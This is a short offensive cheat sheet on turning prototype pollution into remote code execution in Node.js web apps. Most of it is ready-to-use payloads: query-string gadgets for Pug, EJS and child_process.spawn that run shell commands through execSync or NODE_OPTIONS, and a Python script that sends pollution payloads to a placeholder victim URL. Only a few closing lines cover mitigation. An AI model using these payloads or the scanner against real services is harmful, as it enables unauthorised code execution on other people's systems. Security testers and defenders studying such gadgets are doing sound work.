# Prototype Pollution to RCE Chain

Chaining client-side prototype pollution to server-side RCE in Node.js apps.

## Detection

```javascript
// Check if pollution works
?__proto__[test]=polluted
// Then check: {}.test === "polluted"
```

## Common Gadgets

### Express + Pug (RCE)

```javascript
// Pollute to inject template
?__proto__[block]={"type":"Text","val":"x]}'+global.process.mainModule.require('child_process').execSync('id')+'"}
```

### EJS Template (RCE)

```javascript
?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');//
```

### child_process.spawn (RCE)

```javascript
?__proto__[shell]=true
?__proto__[env]={"NODE_OPTIONS":"--require /proc/self/environ"}
```

## Script

```python
import requests

target = "https://victim.app/"
payloads = [
    "__proto__[__proto__][test]=1",
    "constructor[prototype][test]=1",
]

for p in payloads:
    r = requests.get(f"{target}?{p}", verify=False)
    if "polluted" in r.text:
        print(f"[+] Vulnerable: {p}")
```

## Mitigation

- Use `Object.create(null)` for plain dicts
- Map instead of Object for user-controlled keys
- `Object.freeze(Object.prototype)`
